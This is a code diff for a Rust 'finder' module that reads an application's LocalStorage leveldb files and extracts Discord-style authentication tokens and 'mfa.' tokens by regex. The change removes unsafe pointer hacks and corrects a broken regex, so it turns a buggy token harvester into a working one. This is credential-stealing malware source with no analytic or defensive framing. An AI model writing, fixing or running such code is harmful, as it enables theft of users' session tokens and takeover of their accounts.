@@ -1,48 +1,65 @@
 pub mod finder {
+    use regex::Regex;
+    use std::fs::{metadata, read_dir, File};
+    use std::io::{self, BufRead, BufReader};
+    use std::path::Path;
+
+    fn get_extension(filename: &str) -> Option<&str> {
+        Path::new(filename).extension().and_then(|ext| ext.to_str())
+    }
+
     pub fn find_tokens(p: &String) -> Result<Vec<String>, std::io::Error> {
-        use regex::Regex;
-        use std::fs::{metadata, read_dir};
-        unsafe fn duplicate<T>(item: &T) -> T {
-            std::ptr::read(item)
-        }
         let path = format!("{}\\LocalStorage\\leveldb", p);
+        
+        if !Path::new(&path).exists() {
+            return Ok(Vec::new());
+        }
 
         let r = read_dir(path)?;
-
         let mut tokens: Vec<String> = Vec::new();
+        let token_regex = Regex::new(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}").unwrap();
+        let mfa_regex = Regex::new(r"mfa\.[\w-]{84}").unwrap();
         
-        for path in r {
-            unsafe {
-                let path2 = duplicate(&path);
-                let check = metadata(format!("{}", path2.unwrap().path().to_string_lossy()));
-
-                if check.unwrap().is_file() {
-                    let path3 = duplicate(&path).unwrap().path();
-                    let path4 = duplicate(&path);
-                    let extension = get_extension(path3.to_str().unwrap()).unwrap();
-                    if extension != ".ldb" && extension != ".log" {
+        for entry in r {
+            let entry = entry?;
+            let path_buf = entry.path();
+            let path_str = path_buf.to_string_lossy();
+            
+            // Check if it's a file
+            if let Ok(metadata) = metadata(&path_buf) {
+                if metadata.is_file() {
+                    // Check extension
+                    if let Some(extension) = get_extension(&path_str) {
+                        if extension != "ldb" && extension != "log" {
+                            continue;
+                        }
+                    } else {
                         continue;
                     }
-                    let regex =
-                        Regex::new(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}").unwrap();
-                    let raw_lines = read_lines(format!("{}", path4.unwrap().path().to_string_lossy()));
-                    let mut lines: Vec<String> = Vec::new();
-                    for line in raw_lines.unwrap() {
-                        match line {
-                            Ok(v) => lines.push(v),
-                            Err(..) => (),
-                        }
-                    }
-                    for line in lines {
-                        for caps in regex.captures_iter(&line[..]) {
-                            for i in 0..caps.len() {
-                                tokens.push(format!("{}", &caps[i]));
+                    
+                    if let Ok(file) = File::open(&path_buf) {
+                        let reader = BufReader::new(file);
+                        
+                        for line in reader.lines() {
+                            if let Ok(line_content) = line {
+                                for caps in token_regex.captures_iter(&line_content) {
+                                    if let Some(matched) = caps.get(0) {
+                                        tokens.push(matched.as_str().to_string());
+                                    }
+                                }
+                                
+                                for caps in mfa_regex.captures_iter(&line_content) {
+                                    if let Some(matched) = caps.get(0) {
+                                        tokens.push(matched.as_str().to_string());
+                                    }
+                                }
                             }
                         }
                     }
                 }
             }
         }
+        
         Ok(tokens)
     }
 }
